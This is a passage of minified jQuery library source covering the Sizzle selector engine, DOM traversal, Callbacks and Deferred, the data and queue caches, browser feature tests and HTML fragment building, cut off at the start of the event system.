checkContext=null,ret}];i<len;i++)if(matcher=Expr.relative[tokens[i].type])matchers=[addCombinator(elementMatcher(matchers),matcher)];else{if((matcher=Expr.filter[tokens[i].type].apply(null,tokens[i].matches))[expando]){for(j=++i;j<len&&!Expr.relative[tokens[j].type];j++);return setMatcher(i>1&&elementMatcher(matchers),i>1&&toSelector(tokens.slice(0,i-1).concat({value:" "===tokens[i-2].type?"*":""})).replace(rtrim,"$1"),matcher,i<j&&matcherFromTokens(tokens.slice(i,j)),j<len&&matcherFromTokens(tokens=tokens.slice(j)),j<len&&toSelector(tokens))}matchers.push(matcher)}return elementMatcher(matchers)}return setFilters.prototype=Expr.filters=Expr.pseudos,Expr.setFilters=new setFilters,tokenize=Sizzle.tokenize=function(selector,parseOnly){var matched,match,tokens,type,soFar,groups,preFilters,cached=tokenCache[selector+" "];if(cached)return parseOnly?0:cached.slice(0);for(soFar=selector,groups=[],preFilters=Expr.preFilter;soFar;){for(type in matched&&!(match=rcomma.exec(soFar))||(match&&(soFar=soFar.slice(match[0].length)||soFar),groups.push(tokens=[])),matched=!1,(match=rcombinators.exec(soFar))&&(matched=match.shift(),tokens.push({value:matched,type:match[0].replace(rtrim," ")}),soFar=soFar.slice(matched.length)),Expr.filter)!(match=matchExpr[type].exec(soFar))||preFilters[type]&&!(match=preFilters[type](match))||(matched=match.shift(),tokens.push({value:matched,type:type,matches:match}),soFar=soFar.slice(matched.length));if(!matched)break}return parseOnly?soFar.length:soFar?Sizzle.error(selector):tokenCache(selector,groups).slice(0)},compile=Sizzle.compile=function(selector,match){var i,setMatchers=[],elementMatchers=[],cached=compilerCache[selector+" "];if(!cached){for(match||(match=tokenize(selector)),i=match.length;i--;)(cached=matcherFromTokens(match[i]))[expando]?setMatchers.push(cached):elementMatchers.push(cached);cached=compilerCache(selector,function matcherFromGroupMatchers(elementMatchers,setMatchers){var bySet=setMatchers.length>0,byElement=elementMatchers.length>0,superMatcher=function(seed,context,xml,results,outermost){var elem,j,matcher,matchedCount=0,i="0",unmatched=seed&&[],setMatched=[],contextBackup=outermostContext,elems=seed||byElement&&Expr.find.TAG("*",outermost),dirrunsUnique=dirruns+=null==contextBackup?1:Math.random()||.1,len=elems.length;for(outermost&&(outermostContext=context===document||context||outermost);i!==len&&null!=(elem=elems[i]);i++){if(byElement&&elem){for(j=0,context||elem.ownerDocument===document||(setDocument(elem),xml=!documentIsHTML);matcher=elementMatchers[j++];)if(matcher(elem,context||document,xml)){results.push(elem);break}outermost&&(dirruns=dirrunsUnique)}bySet&&((elem=!matcher&&elem)&&matchedCount--,seed&&unmatched.push(elem))}if(matchedCount+=i,bySet&&i!==matchedCount){for(j=0;matcher=setMatchers[j++];)matcher(unmatched,setMatched,context,xml);if(seed){if(matchedCount>0)for(;i--;)unmatched[i]||setMatched[i]||(setMatched[i]=pop.call(results));setMatched=condense(setMatched)}push.apply(results,setMatched),outermost&&!seed&&setMatched.length>0&&matchedCount+setMatchers.length>1&&Sizzle.uniqueSort(results)}return outermost&&(dirruns=dirrunsUnique,outermostContext=contextBackup),unmatched};return bySet?markFunction(superMatcher):superMatcher}(elementMatchers,setMatchers)),cached.selector=selector}return cached},select=Sizzle.select=function(selector,context,results,seed){var i,tokens,token,type,find,compiled="function"==typeof selector&&selector,match=!seed&&tokenize(selector=compiled.selector||selector);if(results=results||[],1===match.length){if((tokens=match[0]=match[0].slice(0)).length>2&&"ID"===(token=tokens[0]).type&&support.getById&&9===context.nodeType&&documentIsHTML&&Expr.relative[tokens[1].type]){if(!(context=(Expr.find.ID(token.matches[0].replace(runescape,funescape),context)||[])[0]))return results;compiled&&(context=context.parentNode),selector=selector.slice(tokens.shift().value.length)}for(i=matchExpr.needsContext.test(selector)?0:tokens.length;i--&&(token=tokens[i],!Expr.relative[type=token.type]);)if((find=Expr.find[type])&&(seed=find(token.matches[0].replace(runescape,funescape),rsibling.test(tokens[0].type)&&testContext(context.parentNode)||context))){if(tokens.splice(i,1),!(selector=seed.length&&toSelector(tokens)))return push.apply(results,seed),results;break}}return(compiled||compile(selector,match))(seed,context,!documentIsHTML,results,!context||rsibling.test(selector)&&testContext(context.parentNode)||context),results},support.sortStable=expando.split("").sort(sortOrder).join("")===expando,support.detectDuplicates=!!hasDuplicate,setDocument(),support.sortDetached=assert((function(div1){return 1&div1.compareDocumentPosition(document.createElement("div"))})),assert((function(div){return div.innerHTML="<a href='#'></a>","#"===div.firstChild.getAttribute("href")}))||addHandle("type|href|height|width",(function(elem,name,isXML){if(!isXML)return elem.getAttribute(name,"type"===name.toLowerCase()?1:2)})),support.attributes&&assert((function(div){return div.innerHTML="<input/>",div.firstChild.setAttribute("value",""),""===div.firstChild.getAttribute("value")}))||addHandle("value",(function(elem,name,isXML){if(!isXML&&"input"===elem.nodeName.toLowerCase())return elem.defaultValue})),assert((function(div){return null==div.getAttribute("disabled")}))||addHandle(booleans,(function(elem,name,isXML){var val;if(!isXML)return!0===elem[name]?name.toLowerCase():(val=elem.getAttributeNode(name))&&val.specified?val.value:null})),Sizzle}(window);jQuery.find=Sizzle,jQuery.expr=Sizzle.selectors,jQuery.expr[":"]=jQuery.expr.pseudos,jQuery.uniqueSort=jQuery.unique=Sizzle.uniqueSort,jQuery.text=Sizzle.getText,jQuery.isXMLDoc=Sizzle.isXML,jQuery.contains=Sizzle.contains;var dir=function(elem,dir,until){for(var matched=[],truncate=void 0!==until;(elem=elem[dir])&&9!==elem.nodeType;)if(1===elem.nodeType){if(truncate&&jQuery(elem).is(until))break;matched.push(elem)}return matched},siblings=function(n,elem){for(var matched=[];n;n=n.nextSibling)1===n.nodeType&&n!==elem&&matched.push(n);return matched},rneedsContext=jQuery.expr.match.needsContext,rsingleTag=/^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,risSimple=/^.[^:#\[\.,]*$/;function winnow(elements,qualifier,not){if(jQuery.isFunction(qualifier))return jQuery.grep(elements,(function(elem,i){return!!qualifier.call(elem,i,elem)!==not}));if(qualifier.nodeType)return jQuery.grep(elements,(function(elem){return elem===qualifier!==not}));if("string"==typeof qualifier){if(risSimple.test(qualifier))return jQuery.filter(qualifier,elements,not);qualifier=jQuery.filter(qualifier,elements)}return jQuery.grep(elements,(function(elem){return jQuery.inArray(elem,qualifier)>-1!==not}))}jQuery.filter=function(expr,elems,not){var elem=elems[0];return not&&(expr=":not("+expr+")"),1===elems.length&&1===elem.nodeType?jQuery.find.matchesSelector(elem,expr)?[elem]:[]:jQuery.find.matches(expr,jQuery.grep(elems,(function(elem){return 1===elem.nodeType})))},jQuery.fn.extend({find:function(selector){var i,ret=[],self=this,len=self.length;if("string"!=typeof selector)return this.pushStack(jQuery(selector).filter((function(){for(i=0;i<len;i++)if(jQuery.contains(self[i],this))return!0})));for(i=0;i<len;i++)jQuery.find(selector,self[i],ret);return(ret=this.pushStack(len>1?jQuery.unique(ret):ret)).selector=this.selector?this.selector+" "+selector:selector,ret},filter:function(selector){return this.pushStack(winnow(this,selector||[],!1))},not:function(selector){return this.pushStack(winnow(this,selector||[],!0))},is:function(selector){return!!winnow(this,"string"==typeof selector&&rneedsContext.test(selector)?jQuery(selector):selector||[],!1).length}});var rootjQuery,rquickExpr=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;(jQuery.fn.init=function(selector,context,root){var match,elem;if(!selector)return this;if(root=root||rootjQuery,"string"==typeof selector){if(!(match="<"===selector.charAt(0)&&">"===selector.charAt(selector.length-1)&&selector.length>=3?[null,selector,null]:rquickExpr.exec(selector))||!match[1]&&context)return!context||context.jquery?(context||root).find(selector):this.constructor(context).find(selector);if(match[1]){if(context=context instanceof jQuery?context[0]:context,jQuery.merge(this,jQuery.parseHTML(match[1],context&&context.nodeType?context.ownerDocument||context:document,!0)),rsingleTag.test(match[1])&&jQuery.isPlainObject(context))for(match in context)jQuery.isFunction(this[match])?this[match](context[match]):this.attr(match,context[match]);return this}if((elem=document.getElementById(match[2]))&&elem.parentNode){if(elem.id!==match[2])return rootjQuery.find(selector);this.length=1,this[0]=elem}return this.context=document,this.selector=selector,this}return selector.nodeType?(this.context=this[0]=selector,this.length=1,this):jQuery.isFunction(selector)?void 0!==root.ready?root.ready(selector):selector(jQuery):(void 0!==selector.selector&&(this.selector=selector.selector,this.context=selector.context),jQuery.makeArray(selector,this))}).prototype=jQuery.fn,rootjQuery=jQuery(document);var rparentsprev=/^(?:parents|prev(?:Until|All))/,guaranteedUnique={children:!0,contents:!0,next:!0,prev:!0};function sibling(cur,dir){do{cur=cur[dir]}while(cur&&1!==cur.nodeType);return cur}jQuery.fn.extend({has:function(target){var i,targets=jQuery(target,this),len=targets.length;return this.filter((function(){for(i=0;i<len;i++)if(jQuery.contains(this,targets[i]))return!0}))},closest:function(selectors,context){for(var cur,i=0,l=this.length,matched=[],pos=rneedsContext.test(selectors)||"string"!=typeof selectors?jQuery(selectors,context||this.context):0;i<l;i++)for(cur=this[i];cur&&cur!==context;cur=cur.parentNode)if(cur.nodeType<11&&(pos?pos.index(cur)>-1:1===cur.nodeType&&jQuery.find.matchesSelector(cur,selectors))){matched.push(cur);break}return this.pushStack(matched.length>1?jQuery.uniqueSort(matched):matched)},index:function(elem){return elem?"string"==typeof elem?jQuery.inArray(this[0],jQuery(elem)):jQuery.inArray(elem.jquery?elem[0]:elem,this):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(selector,context){return this.pushStack(jQuery.uniqueSort(jQuery.merge(this.get(),jQuery(selector,context))))},addBack:function(selector){return this.add(null==selector?this.prevObject:this.prevObject.filter(selector))}}),jQuery.each({parent:function(elem){var parent=elem.parentNode;return parent&&11!==parent.nodeType?parent:null},parents:function(elem){return dir(elem,"parentNode")},parentsUntil:function(elem,i,until){return dir(elem,"parentNode",until)},next:function(elem){return sibling(elem,"nextSibling")},prev:function(elem){return sibling(elem,"previousSibling")},nextAll:function(elem){return dir(elem,"nextSibling")},prevAll:function(elem){return dir(elem,"previousSibling")},nextUntil:function(elem,i,until){return dir(elem,"nextSibling",until)},prevUntil:function(elem,i,until){return dir(elem,"previousSibling",until)},siblings:function(elem){return siblings((elem.parentNode||{}).firstChild,elem)},children:function(elem){return siblings(elem.firstChild)},contents:function(elem){return jQuery.nodeName(elem,"iframe")?elem.contentDocument||elem.contentWindow.document:jQuery.merge([],elem.childNodes)}},(function(name,fn){jQuery.fn[name]=function(until,selector){var ret=jQuery.map(this,fn,until);return"Until"!==name.slice(-5)&&(selector=until),selector&&"string"==typeof selector&&(ret=jQuery.filter(selector,ret)),this.length>1&&(guaranteedUnique[name]||(ret=jQuery.uniqueSort(ret)),rparentsprev.test(name)&&(ret=ret.reverse())),this.pushStack(ret)}}));var readyList,i,rnotwhite=/\S+/g;function detach(){document.addEventListener?(document.removeEventListener("DOMContentLoaded",completed),window.removeEventListener("load",completed)):(document.detachEvent("onreadystatechange",completed),window.detachEvent("onload",completed))}function completed(){(document.addEventListener||"load"===window.event.type||"complete"===document.readyState)&&(detach(),jQuery.ready())}for(i in jQuery.Callbacks=function(options){options="string"==typeof options?function createOptions(options){var object={};return jQuery.each(options.match(rnotwhite)||[],(function(_,flag){object[flag]=!0})),object}(options):jQuery.extend({},options);var firing,memory,fired,locked,list=[],queue=[],firingIndex=-1,fire=function(){for(locked=options.once,fired=firing=!0;queue.length;firingIndex=-1)for(memory=queue.shift();++firingIndex<list.length;)!1===list[firingIndex].apply(memory[0],memory[1])&&options.stopOnFalse&&(firingIndex=list.length,memory=!1);options.memory||(memory=!1),firing=!1,locked&&(list=memory?[]:"")},self={add:function(){return list&&(memory&&!firing&&(firingIndex=list.length-1,queue.push(memory)),function add(args){jQuery.each(args,(function(_,arg){jQuery.isFunction(arg)?options.unique&&self.has(arg)||list.push(arg):arg&&arg.length&&"string"!==jQuery.type(arg)&&add(arg)}))}(arguments),memory&&!firing&&fire()),this},remove:function(){return jQuery.each(arguments,(function(_,arg){for(var index;(index=jQuery.inArray(arg,list,index))>-1;)list.splice(index,1),index<=firingIndex&&firingIndex--})),this},has:function(fn){return fn?jQuery.inArray(fn,list)>-1:list.length>0},empty:function(){return list&&(list=[]),this},disable:function(){return locked=queue=[],list=memory="",this},disabled:function(){return!list},lock:function(){return locked=!0,memory||self.disable(),this},locked:function(){return!!locked},fireWith:function(context,args){return locked||(args=[context,(args=args||[]).slice?args.slice():args],queue.push(args),firing||fire()),this},fire:function(){return self.fireWith(this,arguments),this},fired:function(){return!!fired}};return self},jQuery.extend({Deferred:function(func){var tuples=[["resolve","done",jQuery.Callbacks("once memory"),"resolved"],["reject","fail",jQuery.Callbacks("once memory"),"rejected"],["notify","progress",jQuery.Callbacks("memory")]],state="pending",promise={state:function(){return state},always:function(){return deferred.done(arguments).fail(arguments),this},then:function(){var fns=arguments;return jQuery.Deferred((function(newDefer){jQuery.each(tuples,(function(i,tuple){var fn=jQuery.isFunction(fns[i])&&fns[i];deferred[tuple[1]]((function(){var returned=fn&&fn.apply(this,arguments);returned&&jQuery.isFunction(returned.promise)?returned.promise().progress(newDefer.notify).done(newDefer.resolve).fail(newDefer.reject):newDefer[tuple[0]+"With"](this===promise?newDefer.promise():this,fn?[returned]:arguments)}))})),fns=null})).promise()},promise:function(obj){return null!=obj?jQuery.extend(obj,promise):promise}},deferred={};return promise.pipe=promise.then,jQuery.each(tuples,(function(i,tuple){var list=tuple[2],stateString=tuple[3];promise[tuple[1]]=list.add,stateString&&list.add((function(){state=stateString}),tuples[1^i][2].disable,tuples[2][2].lock),deferred[tuple[0]]=function(){return deferred[tuple[0]+"With"](this===deferred?promise:this,arguments),this},deferred[tuple[0]+"With"]=list.fireWith})),promise.promise(deferred),func&&func.call(deferred,deferred),deferred},when:function(subordinate){var progressValues,progressContexts,resolveContexts,i=0,resolveValues=slice.call(arguments),length=resolveValues.length,remaining=1!==length||subordinate&&jQuery.isFunction(subordinate.promise)?length:0,deferred=1===remaining?subordinate:jQuery.Deferred(),updateFunc=function(i,contexts,values){return function(value){contexts[i]=this,values[i]=arguments.length>1?slice.call(arguments):value,values===progressValues?deferred.notifyWith(contexts,values):--remaining||deferred.resolveWith(contexts,values)}};if(length>1)for(progressValues=new Array(length),progressContexts=new Array(length),resolveContexts=new Array(length);i<length;i++)resolveValues[i]&&jQuery.isFunction(resolveValues[i].promise)?resolveValues[i].promise().progress(updateFunc(i,progressContexts,progressValues)).done(updateFunc(i,resolveContexts,resolveValues)).fail(deferred.reject):--remaining;return remaining||deferred.resolveWith(resolveContexts,resolveValues),deferred.promise()}}),jQuery.fn.ready=function(fn){return jQuery.ready.promise().done(fn),this},jQuery.extend({isReady:!1,readyWait:1,holdReady:function(hold){hold?jQuery.readyWait++:jQuery.ready(!0)},ready:function(wait){(!0===wait?--jQuery.readyWait:jQuery.isReady)||(jQuery.isReady=!0,!0!==wait&&--jQuery.readyWait>0||(readyList.resolveWith(document,[jQuery]),jQuery.fn.triggerHandler&&(jQuery(document).triggerHandler("ready"),jQuery(document).off("ready"))))}}),jQuery.ready.promise=function(obj){if(!readyList)if(readyList=jQuery.Deferred(),"complete"===document.readyState||"loading"!==document.readyState&&!document.documentElement.doScroll)window.setTimeout(jQuery.ready);else if(document.addEventListener)document.addEventListener("DOMContentLoaded",completed),window.addEventListener("load",completed);else{document.attachEvent("onreadystatechange",completed),window.attachEvent("onload",completed);var top=!1;try{top=null==window.frameElement&&document.documentElement}catch(e){}top&&top.doScroll&&function doScrollCheck(){if(!jQuery.isReady){try{top.doScroll("left")}catch(e){return window.setTimeout(doScrollCheck,50)}detach(),jQuery.ready()}}()}return readyList.promise(obj)},jQuery.ready.promise(),jQuery(support))break;support.ownFirst="0"===i,support.inlineBlockNeedsLayout=!1,jQuery((function(){var val,div,body,container;(body=document.getElementsByTagName("body")[0])&&body.style&&(div=document.createElement("div"),(container=document.createElement("div")).style.cssText="position:absolute;border:0;width:0;height:0;top:0;left:-9999px",body.appendChild(container).appendChild(div),void 0!==div.style.zoom&&(div.style.cssText="display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1",support.inlineBlockNeedsLayout=val=3===div.offsetWidth,val&&(body.style.zoom=1)),body.removeChild(container))})),function(){var div=document.createElement("div");support.deleteExpando=!0;try{delete div.test}catch(e){support.deleteExpando=!1}div=null}();var shrinkWrapBlocksVal,acceptData=function(elem){var noData=jQuery.noData[(elem.nodeName+" ").toLowerCase()],nodeType=+elem.nodeType||1;return(1===nodeType||9===nodeType)&&(!noData||!0!==noData&&elem.getAttribute("classid")===noData)},rbrace=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,rmultiDash=/([A-Z])/g;function dataAttr(elem,key,data){if(void 0===data&&1===elem.nodeType){var name="data-"+key.replace(rmultiDash,"-$1").toLowerCase();if("string"==typeof(data=elem.getAttribute(name))){try{data="true"===data||"false"!==data&&("null"===data?null:+data+""===data?+data:rbrace.test(data)?jQuery.parseJSON(data):data)}catch(e){}jQuery.data(elem,key,data)}else data=void 0}return data}function isEmptyDataObject(obj){var name;for(name in obj)if(("data"!==name||!jQuery.isEmptyObject(obj[name]))&&"toJSON"!==name)return!1;return!0}function internalData(elem,name,data,pvt){if(acceptData(elem)){var ret,thisCache,internalKey=jQuery.expando,isNode=elem.nodeType,cache=isNode?jQuery.cache:elem,id=isNode?elem[internalKey]:elem[internalKey]&&internalKey;if(id&&cache[id]&&(pvt||cache[id].data)||void 0!==data||"string"!=typeof name)return id||(id=isNode?elem[internalKey]=deletedIds.pop()||jQuery.guid++:internalKey),cache[id]||(cache[id]=isNode?{}:{toJSON:jQuery.noop}),"object"!=typeof name&&"function"!=typeof name||(pvt?cache[id]=jQuery.extend(cache[id],name):cache[id].data=jQuery.extend(cache[id].data,name)),thisCache=cache[id],pvt||(thisCache.data||(thisCache.data={}),thisCache=thisCache.data),void 0!==data&&(thisCache[jQuery.camelCase(name)]=data),"string"==typeof name?null==(ret=thisCache[name])&&(ret=thisCache[jQuery.camelCase(name)]):ret=thisCache,ret}}function internalRemoveData(elem,name,pvt){if(acceptData(elem)){var thisCache,i,isNode=elem.nodeType,cache=isNode?jQuery.cache:elem,id=isNode?elem[jQuery.expando]:jQuery.expando;if(cache[id]){if(name&&(thisCache=pvt?cache[id]:cache[id].data)){i=(name=jQuery.isArray(name)?name.concat(jQuery.map(name,jQuery.camelCase)):name in thisCache||(name=jQuery.camelCase(name))in thisCache?[name]:name.split(" ")).length;for(;i--;)delete thisCache[name[i]];if(pvt?!isEmptyDataObject(thisCache):!jQuery.isEmptyObject(thisCache))return}(pvt||(delete cache[id].data,isEmptyDataObject(cache[id])))&&(isNode?jQuery.cleanData([elem],!0):support.deleteExpando||cache!=cache.window?delete cache[id]:cache[id]=void 0)}}}jQuery.extend({cache:{},noData:{"applet ":!0,"embed ":!0,"object ":"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"},hasData:function(elem){return!!(elem=elem.nodeType?jQuery.cache[elem[jQuery.expando]]:elem[jQuery.expando])&&!isEmptyDataObject(elem)},data:function(elem,name,data){return internalData(elem,name,data)},removeData:function(elem,name){return internalRemoveData(elem,name)},_data:function(elem,name,data){return internalData(elem,name,data,!0)},_removeData:function(elem,name){return internalRemoveData(elem,name,!0)}}),jQuery.fn.extend({data:function(key,value){var i,name,data,elem=this[0],attrs=elem&&elem.attributes;if(void 0===key){if(this.length&&(data=jQuery.data(elem),1===elem.nodeType&&!jQuery._data(elem,"parsedAttrs"))){for(i=attrs.length;i--;)attrs[i]&&0===(name=attrs[i].name).indexOf("data-")&&dataAttr(elem,name=jQuery.camelCase(name.slice(5)),data[name]);jQuery._data(elem,"parsedAttrs",!0)}return data}return"object"==typeof key?this.each((function(){jQuery.data(this,key)})):arguments.length>1?this.each((function(){jQuery.data(this,key,value)})):elem?dataAttr(elem,key,jQuery.data(elem,key)):void 0},removeData:function(key){return this.each((function(){jQuery.removeData(this,key)}))}}),jQuery.extend({queue:function(elem,type,data){var queue;if(elem)return type=(type||"fx")+"queue",queue=jQuery._data(elem,type),data&&(!queue||jQuery.isArray(data)?queue=jQuery._data(elem,type,jQuery.makeArray(data)):queue.push(data)),queue||[]},dequeue:function(elem,type){type=type||"fx";var queue=jQuery.queue(elem,type),startLength=queue.length,fn=queue.shift(),hooks=jQuery._queueHooks(elem,type);"inprogress"===fn&&(fn=queue.shift(),startLength--),fn&&("fx"===type&&queue.unshift("inprogress"),delete hooks.stop,fn.call(elem,(function(){jQuery.dequeue(elem,type)}),hooks)),!startLength&&hooks&&hooks.empty.fire()},_queueHooks:function(elem,type){var key=type+"queueHooks";return jQuery._data(elem,key)||jQuery._data(elem,key,{empty:jQuery.Callbacks("once memory").add((function(){jQuery._removeData(elem,type+"queue"),jQuery._removeData(elem,key)}))})}}),jQuery.fn.extend({queue:function(type,data){var setter=2;return"string"!=typeof type&&(data=type,type="fx",setter--),arguments.length<setter?jQuery.queue(this[0],type):void 0===data?this:this.each((function(){var queue=jQuery.queue(this,type,data);jQuery._queueHooks(this,type),"fx"===type&&"inprogress"!==queue[0]&&jQuery.dequeue(this,type)}))},dequeue:function(type){return this.each((function(){jQuery.dequeue(this,type)}))},clearQueue:function(type){return this.queue(type||"fx",[])},promise:function(type,obj){var tmp,count=1,defer=jQuery.Deferred(),elements=this,i=this.length,resolve=function(){--count||defer.resolveWith(elements,[elements])};for("string"!=typeof type&&(obj=type,type=void 0),type=type||"fx";i--;)(tmp=jQuery._data(elements[i],type+"queueHooks"))&&tmp.empty&&(count++,tmp.empty.add(resolve));return resolve(),defer.promise(obj)}}),support.shrinkWrapBlocks=function(){return null!=shrinkWrapBlocksVal?shrinkWrapBlocksVal:(shrinkWrapBlocksVal=!1,(body=document.getElementsByTagName("body")[0])&&body.style?(div=document.createElement("div"),(container=document.createElement("div")).style.cssText="position:absolute;border:0;width:0;height:0;top:0;left:-9999px",body.appendChild(container).appendChild(div),void 0!==div.style.zoom&&(div.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1",div.appendChild(document.createElement("div")).style.width="5px",shrinkWrapBlocksVal=3!==div.offsetWidth),body.removeChild(container),shrinkWrapBlocksVal):void 0);var div,body,container};var pnum=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,rcssNum=new RegExp("^(?:([+-])=|)("+pnum+")([a-z%]*)$","i"),cssExpand=["Top","Right","Bottom","Left"],isHidden=function(elem,el){return elem=el||elem,"none"===jQuery.css(elem,"display")||!jQuery.contains(elem.ownerDocument,elem)};function adjustCSS(elem,prop,valueParts,tween){var adjusted,scale=1,maxIterations=20,currentValue=tween?function(){return tween.cur()}:function(){return jQuery.css(elem,prop,"")},initial=currentValue(),unit=valueParts&&valueParts[3]||(jQuery.cssNumber[prop]?"":"px"),initialInUnit=(jQuery.cssNumber[prop]||"px"!==unit&&+initial)&&rcssNum.exec(jQuery.css(elem,prop));if(initialInUnit&&initialInUnit[3]!==unit){unit=unit||initialInUnit[3],valueParts=valueParts||[],initialInUnit=+initial||1;do{initialInUnit/=scale=scale||".5",jQuery.style(elem,prop,initialInUnit+unit)}while(scale!==(scale=currentValue()/initial)&&1!==scale&&--maxIterations)}return valueParts&&(initialInUnit=+initialInUnit||+initial||0,adjusted=valueParts[1]?initialInUnit+(valueParts[1]+1)*valueParts[2]:+valueParts[2],tween&&(tween.unit=unit,tween.start=initialInUnit,tween.end=adjusted)),adjusted}var div,fragment,input,access=function(elems,fn,key,value,chainable,emptyGet,raw){var i=0,length=elems.length,bulk=null==key;if("object"===jQuery.type(key))for(i in chainable=!0,key)access(elems,fn,i,key[i],!0,emptyGet,raw);else if(void 0!==value&&(chainable=!0,jQuery.isFunction(value)||(raw=!0),bulk&&(raw?(fn.call(elems,value),fn=null):(bulk=fn,fn=function(elem,key,value){return bulk.call(jQuery(elem),value)})),fn))for(;i<length;i++)fn(elems[i],key,raw?value:value.call(elems[i],i,fn(elems[i],key)));return chainable?elems:bulk?fn.call(elems):length?fn(elems[0],key):emptyGet},rcheckableType=/^(?:checkbox|radio)$/i,rtagName=/<([\w:-]+)/,rscriptType=/^$|\/(?:java|ecma)script/i,rleadingWhitespace=/^\s+/,nodeNames="abbr|article|aside|audio|bdi|canvas|data|datalist|details|dialog|figcaption|figure|footer|header|hgroup|main|mark|meter|nav|output|picture|progress|section|summary|template|time|video";function createSafeFragment(document){var list=nodeNames.split("|"),safeFrag=document.createDocumentFragment();if(safeFrag.createElement)for(;list.length;)safeFrag.createElement(list.pop());return safeFrag}div=document.createElement("div"),fragment=document.createDocumentFragment(),input=document.createElement("input"),div.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",support.leadingWhitespace=3===div.firstChild.nodeType,support.tbody=!div.getElementsByTagName("tbody").length,support.htmlSerialize=!!div.getElementsByTagName("link").length,support.html5Clone="<:nav></:nav>"!==document.createElement("nav").cloneNode(!0).outerHTML,input.type="checkbox",input.checked=!0,fragment.appendChild(input),support.appendChecked=input.checked,div.innerHTML="<textarea>x</textarea>",support.noCloneChecked=!!div.cloneNode(!0).lastChild.defaultValue,fragment.appendChild(div),(input=document.createElement("input")).setAttribute("type","radio"),input.setAttribute("checked","checked"),input.setAttribute("name","t"),div.appendChild(input),support.checkClone=div.cloneNode(!0).cloneNode(!0).lastChild.checked,support.noCloneEvent=!!div.addEventListener,div[jQuery.expando]=1,support.attributes=!div.getAttribute(jQuery.expando);var wrapMap={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],area:[1,"<map>","</map>"],param:[1,"<object>","</object>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:support.htmlSerialize?[0,"",""]:[1,"X<div>","</div>"]};function getAll(context,tag){var elems,elem,i=0,found=void 0!==context.getElementsByTagName?context.getElementsByTagName(tag||"*"):void 0!==context.querySelectorAll?context.querySelectorAll(tag||"*"):void 0;if(!found)for(found=[],elems=context.childNodes||context;null!=(elem=elems[i]);i++)!tag||jQuery.nodeName(elem,tag)?found.push(elem):jQuery.merge(found,getAll(elem,tag));return void 0===tag||tag&&jQuery.nodeName(context,tag)?jQuery.merge([context],found):found}function setGlobalEval(elems,refElements){for(var elem,i=0;null!=(elem=elems[i]);i++)jQuery._data(elem,"globalEval",!refElements||jQuery._data(refElements[i],"globalEval"))}wrapMap.optgroup=wrapMap.option,wrapMap.tbody=wrapMap.tfoot=wrapMap.colgroup=wrapMap.caption=wrapMap.thead,wrapMap.th=wrapMap.td;var rhtml=/<|&#?\w+;/,rtbody=/<tbody/i;function fixDefaultChecked(elem){rcheckableType.test(elem.type)&&(elem.defaultChecked=elem.checked)}function buildFragment(elems,context,scripts,selection,ignored){for(var j,elem,contains,tmp,tag,tbody,wrap,l=elems.length,safe=createSafeFragment(context),nodes=[],i=0;i<l;i++)if((elem=elems[i])||0===elem)if("object"===jQuery.type(elem))jQuery.merge(nodes,elem.nodeType?[elem]:elem);else if(rhtml.test(elem)){for(tmp=tmp||safe.appendChild(context.createElement("div")),tag=(rtagName.exec(elem)||["",""])[1].toLowerCase(),wrap=wrapMap[tag]||wrapMap._default,tmp.innerHTML=wrap[1]+jQuery.htmlPrefilter(elem)+wrap[2],j=wrap[0];j--;)tmp=tmp.lastChild;if(!support.leadingWhitespace&&rleadingWhitespace.test(elem)&&nodes.push(context.createTextNode(rleadingWhitespace.exec(elem)[0])),!support.tbody)for(j=(elem="table"!==tag||rtbody.test(elem)?"<table>"!==wrap[1]||rtbody.test(elem)?0:tmp:tmp.firstChild)&&elem.childNodes.length;j--;)jQuery.nodeName(tbody=elem.childNodes[j],"tbody")&&!tbody.childNodes.length&&elem.removeChild(tbody);for(jQuery.merge(nodes,tmp.childNodes),tmp.textContent="";tmp.firstChild;)tmp.removeChild(tmp.firstChild);tmp=safe.lastChild}else nodes.push(context.createTextNode(elem));for(tmp&&safe.removeChild(tmp),support.appendChecked||jQuery.grep(getAll(nodes,"input"),fixDefaultChecked),i=0;elem=nodes[i++];)if(selection&&jQuery.inArray(elem,selection)>-1)ignored&&ignored.push(elem);else if(contains=jQuery.contains(elem.ownerDocument,elem),tmp=getAll(safe.appendChild(elem),"script"),contains&&setGlobalEval(tmp),scripts)for(j=0;elem=tmp[j++];)rscriptType.test(elem.type||"")&&scripts.push(elem);return tmp=null,safe}!function(){var i,eventName,div=document.createElement("div");for(i in{submit:!0,change:!0,focusin:!0})eventName="on"+i,(support[i]=eventName in window)||(div.setAttribute(eventName,"t"),support[i]=!1===div.attributes[eventName].expando);div=null}();var rformElems=/^(?:input|select|textarea)$/i,rkeyEvent=/^key/,rmouseEvent=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,rfocusMorph=/^(?:focusinfocus|focusoutblur)$/,rtypenamespace=/^([^.]*)(?:\.(.+)|)/;function returnTrue(){return!0}function returnFalse(){return!1}function safeActiveElement(){try{return document.activeElement}catch(err){}}function on(elem,types,selector,data,fn,one){var origFn,type;if("object"==typeof types){for(type in"string"!=typeof selector&&(data=data||selector,selector=void 0),types)on(elem,type,selector,data,types[type],one);return elem}if(null==data&&null==fn?(fn=selector,data=selector=void 0):null==fn&&("string"==typeof selector?(fn=data,data=void 0):(fn=data,data=selector,selector=void 0)),!1===fn)fn=returnFalse;else if(!fn)return elem;return 1===one&&(origFn=fn,fn=function(event){return jQuery().off(event),origFn.apply(this,arguments)},fn.guid=origFn.guid||(origFn.guid=jQuery.guid++)),elem.each((function(){jQuery.event.add(this,types,fn,data,selector)}))}jQuery.event={global:{},add:function(elem,types,handler,data,selector){var 